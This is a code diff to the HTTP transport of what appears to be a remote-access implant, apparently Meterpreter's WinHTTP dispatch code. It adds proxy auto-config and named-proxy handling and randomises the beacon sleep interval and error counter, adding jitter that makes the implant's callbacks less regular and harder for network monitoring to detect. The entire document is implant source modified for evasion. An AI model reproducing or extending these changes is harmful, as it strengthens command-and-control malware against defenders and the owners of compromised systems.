@@ -81,6 +81,39 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 						ctx->proxy_for_url = malloc(sizeof(WINHTTP_PROXY_INFO));
 						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
 					}
+					else if (ieConfig.lpszAutoConfigUrl)
+					{
+						// Handle AutoDetect + AutoConfigUrl
+						// The only problem is Win 10 1903 + https pac file, seems it is related to https://answers.microsoft.com/en-us/windows/forum/all/ie-and-edge-ignore-pac-proxy-auto-config-file/26971e51-88ee-43b3-ac0d-7a8d9541690d
+						dprintf("[PROXY] IE config set to autodetect with URL %S", ieConfig.lpszAutoConfigUrl);
+
+						autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
+						autoProxyOpts.dwAutoDetectFlags = 0;
+						autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl;
+
+						if (WinHttpGetProxyForUrl(ctx->internet, ctx->url, &autoProxyOpts, &proxyInfo))
+						{
+							ctx->proxy_for_url = malloc(sizeof(WINHTTP_PROXY_INFO));
+							memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
+						}
+					}
+					else if (ieConfig.lpszProxy)
+					{
+						// Handle AutoDetect + ieConfig.lpszProxy
+						WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)calloc(1, sizeof(WINHTTP_PROXY_INFO));
+						ctx->proxy_for_url = proxyInfo;
+
+						dprintf("[PROXY] IE config set to proxy %S with bypass %S", ieConfig.lpszProxy, ieConfig.lpszProxyBypass);
+
+						proxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+						proxyInfo->lpszProxy = ieConfig.lpszProxy;
+						proxyInfo->lpszProxyBypass = ieConfig.lpszProxyBypass;
+
+						// stop the cleanup code from removing these as we're using them behind the scenes and they will
+						// be freed later instead.
+						ieConfig.lpszProxy = NULL;
+						ieConfig.lpszProxyBypass = NULL;;
+					}
 				}
 				else if (ieConfig.lpszProxy)
 				{
@@ -154,7 +187,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 			dprintf("[%s] failed to set the security flags on the request", direction);
 		}
 	}
-	if (ctx->delay >= 3000)
+	if (ctx->delay >= 6000)
 	{
 		//toybox
 		DWORD dwFlags = 0;
@@ -732,12 +765,12 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			{
 				delay *= 10;
 			}
-
-			ecount++;
-
+			ecount = ecount + rand() % 5 ;
+			//ecount++;
+			DWORD max_delay = 10000 - rand() % 3000;
 			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
-			ctx->delay = min(10000, delay);
-			Sleep(min(10000, delay));
+			ctx->delay = min(max_delay, delay);
+			Sleep(min(max_delay, delay));
 		}
 		else
 		{
